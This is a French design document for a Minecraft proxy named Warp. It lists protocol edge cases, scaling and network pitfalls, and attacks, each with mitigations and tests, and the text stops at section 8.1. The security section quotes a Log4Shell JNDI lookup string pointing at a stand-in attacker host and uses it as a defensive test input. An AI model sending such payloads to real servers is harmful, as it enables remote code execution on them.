# Ce qui peut mal tourner : Edge Cases, Histoires de Production et Inconnues Inconnues

**Date** : 31 mars 2026
**Objectif** : Cataloguer exhaustivement les problemes que seuls les operateurs a grande echelle ou les configurations inhabituelles revelent. Chaque entree contient : description, comment les proxys existants echouent, strategie de mitigation pour Warp, et approche de test.

---

## Table des matieres

1. [Protocole MC : Edge Cases](#1-protocole-mc--edge-cases)
2. [Problemes de Scale (100 -> 1000 -> 10000 joueurs)](#2-problemes-de-scale)
3. [Infrastructure Reseau](#3-infrastructure-reseau)
4. [Hebergement et DDoS](#4-hebergement-et-ddos)
5. [Mods et Clients Modifies](#5-mods-et-clients-modifies)
6. [Clients Legacy (1.7-1.12)](#6-clients-legacy)
7. [Securite et Attaques](#7-securite-et-attaques)
8. [Etat et Corruption de Donnees](#8-etat-et-corruption-de-donnees)
9. [Timezone, Locale et Horloge](#9-timezone-locale-et-horloge)
10. [Mise a Jour et Rollback](#10-mise-a-jour-et-rollback)
11. [Garbage Collection et JVM](#11-garbage-collection-et-jvm)

---

## 1. Protocole MC : Edge Cases

### 1.1 Paquets surdimensionnes (>2 MB)

**Description** : Le protocole MC limite les paquets a 2^21 - 1 octets (2 097 151). Le decompresseur ne gere pas les paquets au-dessus de cette taille. Les chunks denses (terracotta, structures complexes) et les serveurs moddes generent regulierement des paquets de chunk data proches ou depassant cette limite.

**Comment les proxys existants echouent** :
- Le client timeout et ne peut pas decompresser/parser (node-minecraft-protocol #664)
- Velocity rejette certains paquets moddes plus stricts que vanilla (Velocity #1556 : "Actual uncompressed size 16384 is greater than threshold 256")
- Le serveur vanilla accepte les paquets non compresses depassant le seuil, mais Velocity les rejette

**Mitigation Warp** :
- Le blind forwarding elimine le probleme pour ~90% des paquets (pas de decompression = pas de limite)
- Pour les paquets inspectes : streaming decompression avec limite configurable par connexion (defaut 8 MiB, max 128 MiB)
- Propriete systeme pour desactiver la validation comme Velocity (`-Dwarp.max-uncompressed-size=134217728`)

**Test** :
- Generer des chunks avec NBT massif (livres ecrits, coffres remplis de shulker boxes)
- Utiliser le mod Carpet-TIS-Addition avec `/speedtest download` (genere des paquets de 16384 octets non compresses)
- Tester avec des modpacks lourds (GTNewHorizons, All the Mods)

---

### 1.2 Encodage VarInt non standard

**Description** : Les VarInts de Minecraft NE sont PAS des Protocol Buffers VarInts. Ils sont signes mais n'utilisent pas l'encodage ZigZag. Le champ `length` ne doit jamais depasser 3 octets, meme si la valeur encodee est dans la limite. Des implementations naives de VarInt causent des erreurs silencieuses.

**Comment les proxys existants echouent** :
- Des implementations tierces (node-minecraft-protocol, mineflayer) ont eu des bugs subtils en utilisant des bibliotheques protobuf standard
- Les paquets avec un VarInt length de 4 octets sont rejetes par le client vanilla mais certains serveurs moddes les envoient

**Mitigation Warp** :
- Implementation VarInt stricte, validee contre la spec MC Wiki
- Assertion hard que length <= 3 octets dans le decoder
- Mode lenient configurable pour les serveurs moddes

**Test** :
- Fuzzing avec des VarInts de 1 a 5 octets
- Tester les valeurs limites : 0, 127, 128, 2097151, -1, Integer.MAX_VALUE

---

### 1.3 Phase Configuration obligatoire (1.20.2+)

**Description** : Depuis 1.20.2, le protocole impose une phase Configuration entre Login et Play. Le serveur doit envoyer Registry Data, UpdateTags, et Finish Configuration. Sauter cette phase = le client decode les paquets suivants contre la mauvaise table d'IDs.

**Comment les proxys existants echouent** :
- Velocity a des problemes documentes de packet queue "bricolee" pendant la transition Configuration -> Play (electronicboy : "get it out the door")
- Les deconnexions aleatoires au switch serveur (#1251, 53 commentaires) sont directement liees
- Le Registry Data varie entre sous-versions 1.21.x, causant des rejets silencieux cote client
- NanoLimbo a du abandonner la construction manuelle de NBT et envoyer des octets pre-captures

**Mitigation Warp** :
- Machine a etats rigoureuse Handshake -> Login -> Configuration -> Play
- Registry Data pre-capture par version, compresse en GZIP, embarque au compile-time
- Aucun paquet API autorise pendant la transition (file d'attente automatique)
- Validation que la phase est complete avant d'emettre les evenements plugins

**Test** :
- Tester le switch serveur rapide (< 100ms entre deux switches)
- Tester avec des clients 1.20.1 (sans config phase) ET 1.20.2+ (avec)
- Verifier que les Registry Data sont corrects pour chaque sous-version (1.21.0, 1.21.1, 1.21.2, 1.21.5, 1.21.9)
- Comparer les packet ID tables entre versions

---

### 1.4 Changement de format Slot (1.20.5+)

**Description** : Avant 1.20.5, les slots utilisaient un boolean `present` (0x00/0x01). Depuis 1.20.5, c'est un varint de count d'items comme indicateur de presence. Mixer les formats = crash client a la deserialisation.

**Comment les proxys existants echouent** :
- Un proxy qui forward un paquet de slot sans verifier la version le fait en raw bytes (OK si blind forwarding)
- Les proxys qui inspectent/modifient les inventaires doivent maintenir deux codecs (la plupart l'ont appris a la dure)

**Mitigation Warp** :
- Le blind forwarding evite le probleme pour les paquets non inspectes
- Le codec de slot detecte la version du protocole et utilise le bon format
- Unit tests de round-trip serialization/deserialization par version

**Test** :
- Envoyer des paquets d'inventaire pre-1.20.5 a un client 1.20.5+ et vice-versa
- Tester les slots vides, les stacks max (64, 99), et les items avec NBT complexe

---

### 1.5 Changement Heightmap (1.21.5+)

**Description** : Le protocole 770 (1.21.5) passe des heightmaps NBT-embedded long arrays (77 entrees) a un encodage flat direct (max 64 entrees). Le bit-packing change de densite.

**Comment les proxys existants echouent** :
- Les proxys qui inspectent les chunks doivent maintenir deux decodeurs de heightmap
- Erreurs silencieuses : le client genere un terrain corrompu au lieu de crasher

**Mitigation Warp** :
- Blind forwarding pour les paquets de chunk (le proxy n'a generalement pas besoin d'inspecter les chunks)
- Si inspection necessaire : detection automatique du format via protocol version

**Test** :
- Chunks avec heightmaps extremes (Y=320 partout, Y=-64 partout)
- Comparaison visuelle du terrain genere cote client

---

### 1.6 Chat signe et chaine de signatures (1.19+)

**Description** : Depuis 1.19, les messages chat sont signes cryptographiquement par le client. Chaque signature inclut : UUID du joueur, session UUID, timestamp, index de message (incremente a chaque message), sel cryptographique aleatoire, et les signatures des 20 derniers messages vus. Annuler ou modifier un message au niveau proxy casse la chaine de validation.

**Comment les proxys existants echouent** :
- Velocity : annuler un message signe = les messages suivants ont un index invalide = le serveur kick le joueur
- Plugin SignedVelocity necessaire sur TOUS les serveurs + le proxy pour contourner
- Les plugins de chat proxy (HuskChat) kickent les joueurs avec "A plugin tried to cancel a signed chat message"
- BungeeCord : ignore completement le systeme de signature

**Mitigation Warp** :
- API d'evenement de chat qui comprend la chaine de signatures
- Si un message est annule : envoyer un paquet d'acknowledgement au serveur pour maintenir l'index
- Option pour desactiver enforce-secure-profile au niveau proxy
- Mode transparent : le proxy ne touche JAMAIS aux paquets de chat signe par defaut

**Test** :
- Envoyer 100 messages rapides, en annuler certains via plugin, verifier que la chaine reste valide
- Tester avec enforce-secure-profile=true sur le backend
- Tester le report Mojang : verifier que les messages reportes contiennent le bon contexte

---

### 1.7 Seuil de compression et paquets non compresses

**Description** : Le serveur vanilla rejette les paquets compresses EN DESSOUS du seuil, mais accepte les paquets non compresses AU DESSUS du seuil. Un paquet non compresse indique sa taille comme 0 dans le champ "data length". C'est un cas edge ou la spec et l'implementation divergent.

**Comment les proxys existants echouent** :
- Velocity est PLUS strict que vanilla : rejette les paquets non compresses depassant le seuil (Velocity #1556)
- Resultat : des setups moddes marchent sans proxy mais pas avec

**Mitigation Warp** :
- Comportement par defaut : suivre le comportement vanilla (accepter les paquets non compresses quel que soit le seuil)
- Log warning quand un paquet non compresse depasse le seuil (pour debug)
- Option stricte activable via configuration

**Test** :
- Envoyer des paquets non compresses de tailles 256, 1024, 16384 octets avec un seuil de 256
- Verifier que le proxy les forward correctement

---

### 1.8 Changement de JSON camelCase -> snake_case (1.21.5+)

**Description** : Le protocole 1.21.5 change les cles JSON du chat de camelCase (`clickEvent`) a snake_case (`click_event`), et remplace les champs `value` par des noms specifiques a l'action. Manquer cette conversion = les liens cliquables dans le chat ne marchent plus silencieusement.

**Comment les proxys existants echouent** :
- Le blog post "13 jours" documente ce probleme precis : les click events cassaient silencieusement

**Mitigation Warp** :
- Blind forwarding pour les messages chat (le proxy n'a generalement pas besoin de modifier le JSON chat)
- Si modification : conversion automatique basee sur la version du client

**Test** :
- Envoyer des messages avec clickEvent/click_event et hoverEvent/hover_event a des clients de differentes versions
- Verifier que les liens sont cliquables

---

### 1.9 Login Success : encodage UUID version-dependant

**Description** :
- 1.7.x : UUID en string avec tirets (`"550e8400-e29b-..."`)
- 1.8+ : UUID en 16 octets raw
- 1.21-1.21.1 : Octet `0x01` supplementaire apres la liste de proprietes ("Strict Error Handling")
- 1.21.2+ : Cet octet doit etre omis

**Comment les proxys existants echouent** :
- Le blog "13 jours" documente 3 jours passes juste sur le Login Success packet
- `IndexOutOfBoundsException` sur 1.7.x a cause de l'encodage UUID string

**Mitigation Warp** :
- Branching version-specific dans le codec Login Success
- Table de test exhaustive couvrant chaque format

**Test** :
- Connecter avec des clients 1.7.10, 1.8.9, 1.12.2, 1.16.5, 1.20.4, 1.21.0, 1.21.1, 1.21.2, 1.21.5

---

## 2. Problemes de Scale

### 2.1 Limite de file descriptors

**Description** : Chaque connexion joueur = 2 file descriptors (client -> proxy + proxy -> backend). Par defaut Linux limite a 1024 FDs par processus. A ~500 joueurs, le proxy crash avec `Too many open files`.

**Comment les proxys existants echouent** :
- Aucune detection ni message d'erreur clair. Le proxy refuse silencieusement les nouvelles connexions
- Les guides d'installation mentionnent rarement le tuning de `ulimit`

**Mitigation Warp** :
- Verification au demarrage : log WARNING si `ulimit -n < 65535`
- Documentation du tuning dans le guide d'installation
- Metrics Prometheus exposant le nombre de FDs utilises vs la limite

**Test** :
- Lancer avec `ulimit -n 100` et connecter 60 joueurs
- Verifier le message d'erreur et le comportement de degradation gracieuse

---

### 2.2 Epuisement des ports ephemeraux

**Description** : Chaque connexion proxy -> backend consomme un port ephemeral (range par defaut 32768-60999 = ~28000 ports). Avec du server switching frequent et TIME_WAIT de 60s, on peut epuiser les ports bien avant la limite de joueurs.

**Comment les proxys existants echouent** :
- Erreur `EADDRNOTAVAIL` sur les connexions backend, pas de message clair
- Le proxy peut toujours accepter des clients mais ne peut plus les connecter aux backends

**Mitigation Warp** :
- Detection au demarrage : verifier `ip_local_port_range` et log WARNING si < 50000 ports
- Recommander `net.ipv4.ip_local_port_range="1024 65535"` dans la doc
- Recommander `net.ipv4.tcp_tw_reuse=1` pour les setups haute densite
- Metric exposant les ports ephemeraux utilises

**Test** :
- Reduire la range a 100 ports et connecter/deconnecter rapidement 50 joueurs
- Verifier le comportement quand les ports sont epuises

---

### 2.3 Saturation de nf_conntrack

**Description** : Si le serveur utilise iptables ou Docker, chaque connexion TCP est trackee par conntrack. Par defaut, la table est limitee a 65536 entrees. Message kernel : "nf_conntrack: table full, dropping packet".

**Comment les proxys existants echouent** :
- Symptome : nouvelles connexions droppees silencieusement au niveau kernel, le proxy ne recoit meme pas le SYN
- Aucun proxy MC ne mentionne ce probleme

**Mitigation Warp** :
- Guide de tuning kernel dans la doc
- Recommander `net.netfilter.nf_conntrack_max=262144` pour les setups de production
- Ou mieux : utiliser nftables sans conntrack quand c'est possible

**Test** :
- Docker avec `nf_conntrack_max=100` et flood de connexions
- Verifier que le message kernel est detecte et documente

---

### 2.4 Burst de connexions simultanees

**Description** : Lors du lancement d'un evenement ou d'un reboot proxy, des centaines de joueurs se reconnectent en meme temps. Le proxy doit gerer simultanement : handshake MC, requete auth Mojang, connexion backend.

**Comment les proxys existants echouent** :
- BungeeCord : peut geler completement sous charge (#3358, le bug "frozen proxy")
- Velocity : gere mieux mais les auth Mojang deviennent le bottleneck (requetes HTTP externes)
- Timeout par defaut trop bas : joueurs deconnectes avant de pouvoir se connecter

**Mitigation Warp** :
- Connection admission control : limiter le nombre de handshakes simultanes (sem acquise, backpressure)
- Pool de clients HTTP pour l'auth Mojang avec circuit breaker
- Queue d'attente visible pour le joueur ("Position en file : 42")
- Cache des sessions Mojang pour les reconnexions rapides

**Test** :
- SoulFire : 50+ bots se connectant en < 10 secondes
- Mesurer : temps median de connexion, taux d'echec, utilisation CPU/memoire
- Simuler un timeout Mojang API et verifier le circuit breaker

---

### 2.5 Switch serveur simultane massif

**Description** : Quand 200 joueurs changent de serveur en meme temps (fin d'une game, teleportation de lobby), chaque switch implique : phase Configuration, Registry Data, chunks, entity data. Les backends doivent generer le terrain pour tous ces joueurs simultanement.

**Comment les proxys existants echouent** :
- Velocity : paquets perdus, deconnexions aleatoires (#1251)
- Le proxy pause la lecture du backend pendant la transition, causant des timeouts

**Mitigation Warp** :
- Le blind forwarding reduit la charge CPU du proxy pendant le switch
- Pas de pause de lecture : pipeline non-bloquant
- Pregeneration des chunks recommandee (Chunky) dans la doc

**Test** :
- 200 bots switch serveur au meme moment
- Mesurer les deconnexions, les timeouts, la latence du switch

---

### 2.6 Tab list et scoreboard a grande echelle

**Description** : La tab list contient tous les joueurs visibles. A 1000+ joueurs, la taille du paquet PlayerInfo devient enorme. Le scoreboard a des limites de taille (128 teams, 40 objectifs).

**Comment les proxys existants echouent** :
- BungeeCord envoie la tab list complete a chaque joueur -> bandwidth explosive
- Le plugin TAB a du fixer une duplication de bossbar au switch serveur causee par un bug Velocity

**Mitigation Warp** :
- Tab list scope configurable (par serveur, par groupe, global)
- Compression et delta updates pour la tab list
- Reset propre du scoreboard au switch serveur

**Test** :
- 1000 bots connectes, mesurer la bandwidth de la tab list
- Switch serveur avec scoreboard et bossbar actifs, verifier l'absence de duplication

---

## 3. Infrastructure Reseau

### 3.1 Connexions half-open et TCP RST

**Description** : Un client qui crash ou dont le reseau tombe ne ferme pas proprement la connexion TCP (pas de FIN). La connexion reste "half-open" jusqu'au timeout keepalive TCP (souvent 2h par defaut). Ces connexions fantomes consomment des FDs et des ressources.

**Comment les proxys existants echouent** :
- Le joueur apparait "en ligne" pendant des minutes apres un crash client
- Le keepalive MC (30s par defaut) ne detecte pas forcement les connexions mortes si les paquets sont juste droppees (pas de RST)

**Mitigation Warp** :
- TCP keepalive kernel active (`SO_KEEPALIVE`) avec parametres agressifs : idle=30s, interval=10s, count=3
- Keepalive MC avec timeout configurable (defaut 30s, ajustable)
- Detection de connexions mortes via absence de reponse keepalive + timeout
- Nettoyage periodique des connexions sans activite

**Test** :
- Simuler un crash client (kill -9 le processus client)
- Verifier le temps avant detection de la deconnexion
- Simuler un reseau qui droppe les paquets (iptables DROP)

---

### 3.2 Attaque Slowloris / Exhaustion de connexions

**Description** : Un attaquant ouvre des centaines de connexions mais n'envoie jamais les paquets de handshake complets, ou les envoie tres lentement. Chaque connexion consomme un FD et un thread/handler.

**Comment les proxys existants echouent** :
- BungeeCord : gele completement (#3358)
- Velocity : meilleur grace a Netty event loop, mais toujours vulnerable si pas de timeout de handshake

**Mitigation Warp** :
- Timeout de handshake strict : 5 secondes pour completer le handshake MC, sinon deconnexion
- Limiter le nombre de connexions en cours de handshake par IP (defaut : 3)
- Rate limiting par IP sur les nouvelles connexions (defaut : 10/min)
- Detection des connexions qui n'envoient aucun octet apres le SYN

**Test** :
- Script qui ouvre 1000 connexions TCP sans envoyer de donnees
- Verifier que les joueurs legitimes peuvent toujours se connecter
- Mesurer la consommation memoire et CPU

---

### 3.3 Problemes SRV DNS

**Description** : ~15% des joueurs utilisent des resolvers DNS qui ne supportent pas les enregistrements SRV. Cloudflare necessite que les SRV pointent vers des enregistrements DNS-Only (pas proxied). Les changements DNS propagent lentement (TTL).

**Comment les proxys existants echouent** :
- Ce n'est pas un probleme du proxy lui-meme, mais les proxys ne documentent pas les pieges SRV
- La resolution SRV cote proxy (pour les backends) peut aussi echouer sous charge

**Mitigation Warp** :
- Documentation complete des pieges SRV dans le guide d'installation
- Resolution DNS avec cache et TTL respecte pour les adresses backend
- Fallback sur l'IP directe si la resolution SRV echoue
- Log WARNING quand un SRV ne resout pas

**Test** :
- Configurer un backend avec SRV DNS et simuler un echec de resolution
- Tester avec differents resolvers (Google 8.8.8.8, Cloudflare 1.1.1.1, resolvers ISP)

---

### 3.4 IPv6 et Dual-Stack

**Description** : En Allemagne et dans d'autres pays, des FAI fournissent du "Dual-Stack Lite" : IPv6 natif + IPv4 NAT-e. Les clients IPv6-only ne peuvent pas joindre un serveur IPv4-only et vice-versa. L'overhead IPv6 est de 48 octets par paquet (vs 28 pour IPv4).

**Comment les proxys existants echouent** :
- Forge a un bug connu : pas d'IPv6 au dessus de 1.12 (forums MinecraftForge)
- Les bans par IP ne marchent pas bien avec IPv6 (un joueur a des millions d'adresses)

**Mitigation Warp** :
- Bind dual-stack par defaut (ecouter sur `::` qui accepte IPv4 et IPv6)
- Bans par /64 pour IPv6 au lieu de par adresse unique
- Documentation des pieges Dual-Stack Lite

**Test** :
- Tester la connexion depuis un client IPv6-only
- Tester les bans IPv6 par /64
- Tester avec un VPN qui change le MTU

---

### 3.5 MTU et VPN

**Description** : Les joueurs avec VPN ont souvent un MTU reduit (1280-1400 au lieu de 1500). Les paquets MC qui depassent le MTU sont fragmentes, ce qui augmente la latence et le risque de perte. Les implementations TCP cassees dans les routeurs bon marche peuvent mal gerer la fragmentation.

**Comment les proxys existants echouent** :
- Aucune detection ni mitigation. Les joueurs VPN ont des "lag spikes" inexpliques

**Mitigation Warp** :
- Respect du MTU via TCP (la stack TCP gere normalement la segmentation)
- Documentation des problemes MTU/VPN
- Option `read-timeout` configurable plus genereux pour les joueurs haute-latence

**Test** :
- Simuler un MTU de 1280 avec `ip link set dev eth0 mtu 1280`
- Tester avec des paquets de chunks volumineux

---

### 3.6 HAProxy et PROXY Protocol

**Description** : Derriere HAProxy/TCPShield, le proxy MC ne voit que l'IP de HAProxy. Le PROXY protocol v1/v2 transmet l'IP reelle en header avant les donnees MC. Les deux extremites (HAProxy + proxy MC) doivent supporter le PROXY protocol. Activer le PROXY protocol sans le configurer cote load-balancer = le proxy interpret l'IP du joueur comme l'entete PROXY protocol.

**Comment les proxys existants echouent** :
- Velocity #1229 : "pings forever" quand PROXY protocol est active mais HAProxy non configure
- BungeeCord #2590 : le connection throttle ne marche plus avec HAProxy (toutes les connexions viennent de la meme IP)
- Documentation Velocity : "If you don't know what this is for, then don't enable it"

**Mitigation Warp** :
- Support PROXY protocol v1 et v2
- Detection automatique : si les premiers octets sont un header PROXY protocol, le parser, sinon traiter comme connexion directe
- Whitelist d'IPs autorisees a envoyer du PROXY protocol (securite)
- Rate limiting base sur la vraie IP (apres PROXY protocol), pas l'IP du load-balancer

**Test** :
- Tester avec HAProxy en TCP mode + PROXY protocol v2
- Tester sans HAProxy mais avec PROXY protocol active (doit rejeter)
- Tester le rate limiting avec vraies IPs derriere HAProxy

---

## 4. Hebergement et DDoS

### 4.1 Pterodactyl / Pelican

**Description** : Pterodactyl (et son successeur Pelican) est le panel d'administration le plus populaire. Il lance les serveurs dans des containers Docker avec des limites de ressources. Les eggs (templates) doivent etre configures correctement.

**Comment les proxys existants echouent** :
- Les eggs Velocity pour Pterodactyl sont souvent desynchronises avec les dernieres versions
- Docker ajoute une couche de NAT (overhead conntrack, latence)
- Les limites de memoire Docker killent le proxy sans log

**Mitigation Warp** :
- Fournir un egg Pterodactyl/Pelican officiel et maintenu
- Detecter l'execution dans Docker et ajuster les parametres (max-direct-memory, etc.)
- Log explicite quand l'OOM killer est probable (memoire proche de la limite)

**Test** :
- Deployer Warp dans Pterodactyl avec l'egg officiel
- Tester les limites de memoire Docker
- Tester la mise a jour du proxy via Pterodactyl

---

### 4.2 Interaction avec les services anti-DDoS

**Description** : TCPShield, Cosmic Guard, et les protections DDoS des hebergeurs (OVH Game DDoS, Hetzner) filtrent le trafic. Ils peuvent bloquer les paquets MC valides, ajouter de la latence, ou casser le PROXY protocol.

**Comment les proxys existants echouent** :
- TCPShield necessite un plugin specifique pour transmettre la vraie IP
- La protection DDoS OVH droppe parfois des connexions MC legitimes
- Les protections rate-limitent les ping floods, ce qui empeche le server list ping pour les joueurs legitimés

**Mitigation Warp** :
- Support natif TCPShield (PROXY protocol + validation signature)
- Cache de ping agressif pour reduire le nombre de requetes ping
- Documentation des configurations specifiques par hebergeur

**Test** :
- Tester derriere TCPShield
- Simuler un DDoS et verifier que les joueurs legitimes restent connectes

---

### 4.3 Attaques de bots / Login Flood

**Description** : Des centaines de bots se connectent, font le handshake MC + auth Mojang, puis se deconnectent immediatement. Chaque tentative consomme : un FD, une requete HTTP a Mojang, du CPU pour le chiffrement. 200-300 bots/seconde suffisent a crasher BungeeCord (#2854).

**Comment les proxys existants echouent** :
- BungeeCord : crash avec 200-300 requetes/seconde
- Velocity : survit mieux mais l'auth Mojang devient le bottleneck
- Aucune detection native de pattern de bots

**Mitigation Warp** :
- Rate limiting par IP : max connexions/minute configurable
- Rate limiting global : max handshakes simultanes
- Detection de pattern : connexion + deconnexion immediate = suspect
- Blacklist temporaire automatique des IPs suspectes
- Cache des resultats d'auth Mojang (eviter les requetes repetees)
- Option : Captcha-style verification (envoyer un message dans le limbo avant le forward)

**Test** :
- SoulFire avec 500 bots en burst
- Mesurer : CPU, memoire, taux de rejet, impact sur les joueurs legitimes

---

## 5. Mods et Clients Modifies

### 5.1 Forge Handshake et Proxy-Compatible-Forge

**Description** : Forge (et NeoForge) modifie le handshake de login pour negocier les mods et les channels de communication. Le mod `Proxy-Compatible-Forge` est necessaire pour que les proxys Velocity fonctionnent avec Forge. Le handshake Forge inclut : liste de mods, channels custom, et verifications de signature.

**Comment les proxys existants echouent** :
- Velocity #1511 : "Incompatible client" ou blocage infini "Joining world" avec NeoForge
- Velocity #1515 : impossible de connecter un modpack Fabric a travers Velocity
- Velocity #1396 : Fabric 1.20.1 incompatible avec Velocity 3.3.0
- L'API Fabric Networking modifie les paquets de login, cassant la verification de signature

**Mitigation Warp** :
- Mode passthrough pour le handshake Forge : le proxy ne touche pas au handshake Forge, il le forward en raw
- Support configurable de Velocity modern forwarding via un mod companion (comme PCF)
- Pas de limite hardcodee sur le nombre de channels ou la taille du handshake

**Test** :
- Tester avec GTNewHorizons (1.7.10 Forge, le plus gros modpack existant)
- Tester avec All the Mods 10 (NeoForge recent)
- Tester avec un modpack Fabric + Fabric API
- Verifier le switch serveur entre un serveur Forge et un serveur Vanilla

---

### 5.2 Custom Payload / Plugin Messages surdimensionnes

**Description** : Les mods envoient des custom payloads (plugin messages) qui peuvent etre tres gros. Le nom du channel est limite a 64 caracteres. La taille du payload est limitee a 1 048 576 octets (1 MB) dans le protocole, mais certains mods tentent d'envoyer plus. Velocity applique une limite supplementaire sur les known packs.

**Comment les proxys existants echouent** :
- Velocity : "Payload may not be larger than 1048576 bytes"
- Paper : necessite `-Dpaper.disableChannelLimit=true` pour les serveurs moddes
- Velocity : necessite `-Dvelocity.max-known-packs=#` avec un calcul arbitraire (64 + nb_mods * 1.5)
- Forge #9789 : "Payload error when connecting to the Velocity server"

**Mitigation Warp** :
- Limites configurables (pas hardcodees) pour : taille payload, nombre de channels, nombre de known packs
- Defauts genereux pour les setups moddes
- Log detaille quand un payload est rejete (taille, channel, source)

**Test** :
- Envoyer un payload de 2 MB via un mod de test
- Tester avec 500+ mods charges (liste de known packs massive)
- Verifier que le proxy forward les payloads inconnus sans les deserialiser

---

### 5.3 OptiFine, Lunar Client, Badlion

**Description** : Ces clients modifies alterent les reglages Netty TCP, les keepalive, et l'obfuscation empeche l'analyse du code source. Les clients PvP 1.8 (Lunar, Badlion) ont des comportements specifiques : "connection reset by peer" et timeouts pendant les transitions serveur.

**Comment les proxys existants echouent** :
- Velocity #527 : "Connection reset by peer" a frequence elevee avec Lunar/Badlion
- Causes suspectees : fermeture de connexion incorrecte, modification des options TCP Netty, interference avec les keepalive
- Issue ouverte depuis 2021, jamais resolue car les clients sont obfusques

**Mitigation Warp** :
- Timeouts de keepalive plus genereux par defaut
- Detection heuristique du type de client via les premiers paquets (version, marque)
- Profils de timeout par client configurable
- Robustesse face aux fermetures de connexion non standard (catch toutes les IOException dans le pipeline)

**Test** :
- Tester avec Lunar Client 1.8.9, Badlion 1.8.9, OptiFine
- Switch serveur rapide (10 switches en 30 secondes)
- Mesurer le taux de deconnexion vs un client vanilla

---

## 6. Clients Legacy

### 6.1 1.7.x : pas d'UUID dans le handshake

**Description** : Le protocole 1.7.x encode l'UUID en string dans le Login Success packet au lieu de 16 octets raw. Le handshake 1.7 a une structure differente. Les clients 1.7 ne supportent pas la phase Configuration.

**Comment les proxys existants echouent** :
- Velocity supporte 1.7.2+ mais avec des branches de code specifiques et peu testees
- ViaVersion ajoute une couche de traduction avec overhead de performance

**Mitigation Warp** :
- Pour la V1 : supporter 1.20.5+ uniquement (protocole moderne avec Transfer Packet)
- Si support legacy necessaire : couche de traduction optionnelle (comme ViaVersion mais integree)
- Codec Login Success avec branchement par version

**Test** :
- Client 1.7.10 vanilla + ViaVersion backend
- Verifier le forwarding d'UUID et d'IP

---

### 6.2 Pre-Netty legacy ping (1.6 et avant)

**Description** : Avant le refactoring Netty (1.7), le protocole de ping etait completement different. Certains scanners et outils utilisent encore l'ancien format de ping.

**Comment les proxys existants echouent** :
- BungeeCord supporte le legacy ping mais c'est du code fragile
- Velocity ne supporte pas le pre-Netty ping

**Mitigation Warp** :
- Detecter les tentatives de legacy ping (premier octet = 0xFE) et repondre avec un format legacy OU rejeter proprement
- Ne pas crasher sur des paquets de ping non reconnus

**Test** :
- Envoyer un legacy ping (0xFE 0x01) et verifier la reponse
- Envoyer des octets aleatoires et verifier que le proxy ne crash pas

---

### 6.3 Tab-complete pre-1.13

**Description** : Avant 1.13 (Brigadier), la tab-completion envoyait la commande partielle au serveur qui retournait une liste de suggestions. Depuis 1.13, le client a l'arbre de commandes localement. Les proxys doivent gerer les deux systemes.

**Comment les proxys existants echouent** :
- BungeeCord gere les deux mais avec du code legacy non maintenu
- Les commandes proxy peuvent ne pas apparaitre dans le tab-complete pre-1.13

**Mitigation Warp** :
- Si support legacy : implementer les deux systemes de tab-complete
- L'arbre de commandes proxy est envoye au client 1.13+ automatiquement

**Test** :
- Tab-complete une commande proxy sur un client 1.12.2 et un client 1.20.4

---

## 7. Securite et Attaques

### 7.1 UUID Spoofing (BungeeCord IP Forwarding)

**Description** : BungeeCord insere l'IP et l'UUID du joueur en texte clair dans le handshake. Aucun HMAC, aucun secret. Si un attaquant atteint un backend directement (firewall mal configure), il peut se connecter en tant que n'importe quel joueur, y compris les administrateurs. L'exploit est connu depuis 2013.

**Comment les proxys existants echouent** :
- BungeeCord : probleme fondamental de l'architecture, pas de fix possible sans casser la compat
- BungeeGuard (plugin tiers) ajoute un secret mais c'est un patch

**Mitigation Warp** :
- HMAC-SHA256 natif (compatible Velocity modern forwarding)
- Secrets par serveur (pas un secret global)
- Rotation automatique des secrets possible
- Rejection stricte des connexions sans HMAC valide sur les backends

**Test** :
- Tenter une connexion directe au backend avec un handshake falsifie
- Verifier que la connexion est rejetee
- Tester la rotation de secret sans downtime

---

### 7.2 Decompression Bomb / OOM Attack

**Description** : Un attaquant envoie des paquets compresses qui se decompressent a ~8 MB chacun. En envoyant des centaines de ces paquets, le proxy est OOM kill. Le facteur de compression de zlib peut atteindre 1000:1 pour des donnees crafted.

**Comment les proxys existants echouent** :
- Velocity #1742 (mars 2026) : rapporte par un grand reseau, toujours ouvert
- Aucune limite sur la taille decompresse totale par connexion

**Mitigation Warp** :
- Limite de taille decompresse par paquet (8 MiB par defaut, configurable)
- Limite de taille decompresse totale par connexion par seconde (64 MiB/s par defaut)
- Decompression streaming avec arrêt immediat si la limite est atteinte
- Le blind forwarding reduit la surface d'attaque

**Test** :
- Envoyer des paquets compresses qui se decompressent a 8 MB, 16 MB, 128 MB
- Verifier que le proxy deconnecte l'attaquant sans impact sur les autres joueurs

---

### 7.3 Log4Shell (CVE-2021-44228)

**Description** : Un attaquant envoie un message chat contenant `${jndi:ldap://evil.com/a}` qui declenche une resolution JNDI dans Log4j, permettant l'execution de code a distance. Minecraft a ete le vecteur d'attaque le plus mediatise de Log4Shell.

**Comment les proxys existants echouent** :
- Tous les proxys Java utilisant Log4j 2.x < 2.17 etaient vulnerables
- Mitigation temporaire : `-Dlog4j2.formatMsgNoLookups=true`

**Mitigation Warp** :
- NE PAS utiliser Log4j. Utiliser SLF4J + Logback ou java.util.logging
- Si Log4j utilise comme dependance transitive : forcer la version 2.17+ et verifier les lookups desactives
- Ne JAMAIS logger des donnees joueur non sanitisees (noms, messages, IPs)

**Test** :
- Envoyer des messages contenant `${jndi:...}` et verifier que rien n'est resolu
- Audit des dependances pour toute version de Log4j < 2.17

---

### 7.4 Paquets malformes et fuzzing

**Description** : Des clients malveillants envoient des paquets avec des tailles invalides, des IDs inconnus, des VarInts corrompus, des strings de longueur negative, ou des paquets dans le mauvais ordre de la state machine.

**Comment les proxys existants echouent** :
- BungeeCord : crash ou comportement indefini sur certains paquets malformes
- Velocity : meilleur mais certains paquets causent des exceptions non catchees

**Mitigation Warp** :
- Chaque decoder attrape les exceptions et deconnecte proprement (pas de crash du proxy)
- Validation stricte de la state machine : un paquet de Play pendant la phase Login = deconnexion immediate
- Rate limiting des paquets invalides par connexion
- Mode "paranoid" avec logging detaille pour debug

**Test** :
- Fuzzing avec des outils comme MCPTool
- Envoyer des paquets dans le mauvais ordre
- Envoyer des paquets avec des longueurs incorrectes
- Envoyer des milliers de paquets par seconde

---

## 8. Etat et Corruption de Donnees

### 8.1 Race condition : Disconnect/Login (Velocity #1013)

**Description** : Quand un joueur se reconnecte rapidement, la sequence peut etre : Login(nouveau) -> DisconnectEvent(ancien). Le DisconnectEvent nettoie les donnees du nouveau joueur. La connexion est desenregistree AVANT DisconnectEvent, permettant des lookups inconsistants.

**Comment les proxys existants echouent** :
- Velocity : "doesn't offer guarantees, because it is difficult for us to provide one without compromising somewhere"
- Les plugins doivent comparer les references d'objet Player avec des caches weak, ce qui est fragile
